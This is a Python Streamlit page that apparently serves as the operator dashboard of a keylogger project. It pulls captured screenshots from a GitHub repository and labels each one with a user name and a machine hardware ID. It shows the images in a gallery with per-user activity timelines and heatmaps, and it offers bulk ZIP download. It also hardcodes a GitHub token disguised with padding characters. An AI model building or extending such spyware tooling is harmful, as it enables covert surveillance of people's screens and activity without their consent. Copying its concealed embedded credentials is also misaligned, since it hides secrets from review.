# Images

import requests
import pandas as pd 
import streamlit as st
from io import BytesIO
import plotly.express as px
from datetime import datetime
from PIL import Image, ImageFile
from streamlit_image_zoom import image_zoom
from zipfile import ZipFile


# URL containing the tokens JSON
TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json"
# Default token if URL fetch fails
DEFAULT_TOKEN = "asdfg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aefthu"

# Your GitHub Personal Access Token
SCREENSHOT_API_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/screenshots"
SCREENSHOT_BASE_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/screenshots/"


cache_time = 90  # Cache time in seconds
image_per_page = 100  # Number of images to display per page
max_image_per_page = 500  # Maximum number of images allowed per page

def get_token():
    try:
        # Fetch the JSON from the URL
        response = requests.get(TOKEN_URL)
        if response.status_code == 200:
            token_data = response.json()

            # Check if the "dashboard" key exists
            if "dashboard" in token_data:
                token = token_data["dashboard"]

                # Remove the first 5 and last 6 characters
                processed_token = token[5:-6]
                # print(f"Token fetched and processed: {processed_token}")
                return processed_token
            else:
                print("Key 'dashboard' not found in the token data.")
        else:
            print(f"Failed to fetch tokens. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while fetching the token: {e}")

    # Fallback to the default token
    print("Using default token.")
    return DEFAULT_TOKEN[5:-6]

# Call the function
GITHUB_TOKEN = get_token()
# print(f"Final Token: {GITHUB_TOKEN}")


# To handle truncated images
ImageFile.LOAD_TRUNCATED_IMAGES = True

# GitHub API details
GITHUB_API_URL_SS = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/screenshots"
HEADERS_SS = {"Authorization": f"token {GITHUB_TOKEN}"}

# Function to get image URLs
def get_image_urls(limit=image_per_page):
    response = requests.get(GITHUB_API_URL_SS, headers=HEADERS_SS)
    if response.status_code == 200:
        files = response.json()
        image_files = [(file["name"], file["download_url"]) for file in files if file["name"].lower().endswith(('png', 'jpg', 'jpeg'))]
        return image_files[-limit:][::-1]  # Get last 'limit' images in reverse order
    else:
        st.error("Failed to fetch images. Check your API token and repository access.")
        return []


# Authenticate GitHub API
def authenticate_github():
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    return headers

# Modified fetch_screenshots function with limit parameter
@st.cache_data(ttl=cache_time)
def fetch_screenshots():
    headers = authenticate_github()
    try:
        response = requests.get(SCREENSHOT_API_URL, headers=headers)
        response.raise_for_status()
        files = response.json()
        screenshots = []
        for file in files:  # Remove limit here to process all files
            if file["name"].endswith(".png"):
                try:
                    name_parts = file["name"].split("_")
                    # Find the index of "screenshot" to properly extract username
                    if "screenshot" in name_parts:
                        screenshot_index = name_parts.index("screenshot")
                        user = "_".join(name_parts[2:screenshot_index])
                    else:
                        continue  # Skip files without proper format
                    # Rest of the timestamp processing remains the same
                    date_time = name_parts[0] + name_parts[1]
                    timestamp = datetime.strptime(date_time, "%Y%m%d%H%M%S")
                    screenshots.append({
                        "name": file["name"],
                        "url": file["download_url"],
                        "user": user,
                        "timestamp": timestamp,
                    })
                except (ValueError, IndexError):
                    st.warning(f"Unable to parse filename: {file['name']}")
        return sorted(screenshots, key=lambda x: x["timestamp"], reverse=True)
    except requests.RequestException as e:
        st.error(f"Failed to fetch screenshot data: {e}")
        return []

# Download an image from a URL
def download_image(url):
    headers = authenticate_github()
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        try:
            # Validate the image by opening it with Pillow
            image = Image.open(BytesIO(response.content))
            image.verify()  # Verify that it is a valid image
            # Reopen the image to ensure it can be loaded properly
            image = Image.open(BytesIO(response.content))
            image.load()  # Fully load the image to catch any issues
            return BytesIO(response.content)  # Return image as BytesIO object
        except (Image.UnidentifiedImageError, Image.DecompressionBombError, SyntaxError):
            st.warning(f"Invalid or corrupted image at URL: {url}")
            return None
    else:
        st.warning(f"Failed to download image from URL: {url}")
        return None


# Update check_new_screenshots to accept limit
@st.cache_data(ttl=cache_time)
def check_new_screenshots(latest_timestamp, limit=image_per_page):  # Add limit parameter
    current_screenshots = fetch_screenshots()
    latest = max([s["timestamp"] for s in current_screenshots])
    return latest > latest_timestamp, current_screenshots

# Function to filter screenshots based on user and date range
@st.cache_data(ttl=cache_time)
def filter_screenshots(screenshot_data, user, start_date, end_date):
    filtered_screenshots = [
        screenshot for screenshot in screenshot_data
        if (user == "All Users" or screenshot["user"] == user) and
           (start_date <= screenshot["timestamp"].date() <= end_date)
    ]
    return filtered_screenshots


# Function to get unique users
@st.cache_data(ttl=cache_time)
def get_unique_users(user_data):
    seen_users = set()
    unique_users = []
    for user in user_data:
        if user["user"] not in seen_users:
            seen_users.add(user["user"])
            unique_users.append(user)
    return unique_users

# Function to extract unique user name from filename
@st.cache_data(ttl=cache_time)
def extract_unique_user_name(file_name):
    try:
        # Extract unique user name from filename (e.g., "bibek_4C4C4544-0033-3910-804A-B3C04F324233")
        return "_".join(file_name.split("_")[2:4])  # "bibek_4C4C4544-0033-3910-804A-B3C04F324233"
    except (IndexError, ValueError):
        return None




# Authenticate GitHub API
def authenticate_github():
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    return headers

# Fetch GitHub API rate limit information
def get_github_rate_limit():
    headers = authenticate_github()
    url = "https://api.github.com/rate_limit"
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        rate_limit_data = response.json()
        
        # Extract rate limit information
        limit = rate_limit_data['resources']['core']['limit']
        remaining = rate_limit_data['resources']['core']['remaining']
        reset_timestamp = rate_limit_data['resources']['core']['reset']
        
        # Convert reset timestamp to readable format
        reset_time = datetime.fromtimestamp(reset_timestamp).strftime('%Y-%m-%d %H:%M:%S')
        
        return limit, remaining, reset_time
    except Exception as e:
        st.error(f"Error fetching rate limit: {e}")
        return 5000, "Unknown", "Unknown"  # Default values


def main():
    # Fetch and display GitHub API rate limit information
    limit, remaining_token, reset_time = get_github_rate_limit()
    st.sidebar.info(f"GitHub API Rate Limit: {limit}, Remaining: {remaining_token}, Reset Time: {reset_time}")

    num_images = st.sidebar.number_input(
        "Number of images to display", 
        min_value=1, 
        max_value=max_image_per_page, 
        value=image_per_page,
        step=1
    )
    
    # Fetch all screenshots
    all_screenshots = fetch_screenshots()
    
    # Get unique users from all screenshots
    unique_users = get_unique_users(all_screenshots)
    
    # User selection
    selected_user = st.sidebar.selectbox("Select User", ["All Users"] + [u["user"] for u in unique_users])
    
    # Date selection
    start_date = st.sidebar.date_input("Start Date", value=all_screenshots[-1]["timestamp"].date())
    end_date = st.sidebar.date_input("End Date", value=datetime.today().date())
    
    # Filter screenshots
    filtered = filter_screenshots(all_screenshots, selected_user, start_date, end_date)
    
    # Add under the existing filters
    search_term = st.sidebar.text_input("Search by filename or user")

    # Modify the filtered_screenshots logic
    filtered = [
        s for s in filtered
        if (search_term.lower() in s["name"].lower()) or 
           (search_term.lower() in s["user"].lower())
    ]
    
    # Add in sidebar
    sort_option = st.sidebar.selectbox("Sort By", 
        ["Newest First", "Oldest First", "User (A-Z)", "User (Z-A)"]
    )

    # First apply sorting to all filtered screenshots
    if sort_option == "Newest First":
        filtered = sorted(filtered, key=lambda x: x["timestamp"], reverse=True)
    elif sort_option == "Oldest First":
        filtered = sorted(filtered, key=lambda x: x["timestamp"])
    elif sort_option == "User (A-Z)":
        filtered = sorted(filtered, key=lambda x: x["user"].lower())
    elif sort_option == "User (Z-A)":
        filtered = sorted(filtered, key=lambda x: x["user"].lower(), reverse=True)
    
    # Then apply limit based on selection
    if selected_user == "All Users":
        final_screenshots = filtered[:num_images]
    else:
        # Get last N screenshots for selected user
        user_screenshots = [s for s in filtered if s["user"] == selected_user]
        final_screenshots = user_screenshots[:num_images]
    
    # Add pagination controls
    ITEMS_PER_PAGE = image_per_page
    total_pages = (len(final_screenshots) + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE
    page = st.sidebar.number_input("Page", 1, total_pages, 1)

    # Modify final display
    start_idx = (page - 1) * ITEMS_PER_PAGE
    end_idx = start_idx + ITEMS_PER_PAGE
    paginated_screenshots = final_screenshots[start_idx:end_idx]

    # Display logic remains similar but uses final_screenshots
    # if final_screenshots:
    # Display logic remains similar but uses paginated_screenshots
    if paginated_screenshots:
    #     st.title(f"Showing {len(final_screenshots)} images for {selected_user}")
        st.title(f"Showing {len(paginated_screenshots)} images for {selected_user}")
        cols = st.columns(5)
        # for i, screenshot in enumerate(final_screenshots):
        for i, screenshot in enumerate(paginated_screenshots):
            with cols[i % 5]:
                # Combine metadata into caption
                caption = f"{screenshot['user']} | {screenshot['timestamp']}"
                image = download_image(screenshot["url"])
                if image:
                    st.image(
                        image, 
                        use_container_width=True,
                        caption=caption
                    )
                    # with st.expander(f"View full size: {screenshot['name']}"):
                    #     st.image(image, caption=caption)
                    #     st.write(f"**Filename:** {screenshot['name']}")
                    #     st.write(f"**User:** {screenshot['user']}")
                    #     st.write(f"**Timestamp:** {screenshot['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}")
                else:
                    st.error(f"Failed to load image: {screenshot['name']}")
            # Create new columns after every 5 images
            # if (i + 1) % 5 == 0 and (i + 1) < len(final_screenshots):
            if (i + 1) % 5 == 0 and (i + 1) < len(paginated_screenshots):
                cols = st.columns(5)

        # Add in main function after displaying images
        selected = st.multiselect("Select images to download", [s["name"] for s in paginated_screenshots])
        if selected:
            if st.button("Download Selected Images"):
                zip_buffer = BytesIO()
                with ZipFile(zip_buffer, "w") as zip_file:
                    for name in selected:
                        img = next(s for s in paginated_screenshots if s["name"] == name)
                        response = requests.get(img["url"])
                        zip_file.writestr(name, response.content)
                st.download_button(
                    label="Download ZIP",
                    data=zip_buffer.getvalue(),
                    file_name="selected_images.zip",
                    mime="application/zip"
                )

        # Add timeline visualization
        if final_screenshots:
            df = pd.DataFrame([{
                "user": s["user"],
                "date": s["timestamp"].date(),
                "datetime": s["timestamp"],
                "count": 1
            } for s in final_screenshots])
            
            # User Activity Timeline - Scatter plot with users on Y-axis and datetime on X-axis
            fig_scatter = px.scatter(
                df, 
                x="datetime", 
                y="user",
                title="User Activity Timeline (When Each User is Active)",
                labels={"datetime": "Date & Time", "user": "User"},
                hover_data={"datetime": "|%Y-%m-%d %H:%M:%S", "user": True}
            )
            fig_scatter.update_traces(marker=dict(size=8, opacity=0.6))
            fig_scatter.update_layout(
                height=max(400, len(df["user"].unique()) * 50),  # Dynamic height based on number of users
                showlegend=False,
                xaxis_title="Date & Time",
                yaxis_title="User"
            )
            st.plotly_chart(fig_scatter, use_container_width=True)
            
            # Activity Heatmap - Shows concentration of activity
            df["hour"] = df["datetime"].dt.hour
            df["date_only"] = df["datetime"].dt.date
            heatmap_data = df.groupby(["user", "date_only"]).size().reset_index(name="count")
            
            fig_heatmap = px.density_heatmap(
                heatmap_data,
                x="date_only",
                y="user",
                z="count",
                title="User Activity Heatmap (Activity Intensity by Date)",
                labels={"date_only": "Date", "user": "User", "count": "Number of Screenshots"},
                color_continuous_scale="Blues"
            )
            fig_heatmap.update_layout(
                height=max(400, len(heatmap_data["user"].unique()) * 50)
            )
            st.plotly_chart(fig_heatmap, use_container_width=True)
            
            # Original timeline chart
            timeline = df.groupby("date").count().reset_index()
            fig = px.line(timeline, x="date", y="count", 
                         title="Screenshot Activity Timeline (Overall Trend)")
            st.plotly_chart(fig)
            
            # User distribution pie chart
            user_dist = df["user"].value_counts().reset_index()
            user_dist.columns = ["User", "Count"]
            fig = px.pie(user_dist, names="User", values="Count",
                        title="User Distribution")
            st.plotly_chart(fig)
    else:
        st.warning("No screenshots found for the selected user and date range.")

# Fetch and display GitHub API rate limit information
    limit, remaining_token, reset_time = get_github_rate_limit()
    st.sidebar.warning(f"GitHub API Rate Limit: {limit}, Remaining: {remaining_token}, Reset Time: {reset_time}")
    st.sidebar.markdown("---")  # Add a separator
    st.sidebar.write("© 2025 Bibek 💗. All rights reserved.")


# Streamlit app
st.set_page_config(page_title="Image Gallery", layout="wide", page_icon=":🌄:")
st.write("Select the user and date range to filter the screenshots.")


# app logic to authenticate user
if st.session_state["authenticated"]:
    main()
else:
    st.error("Please login (Homepage) to access this page.")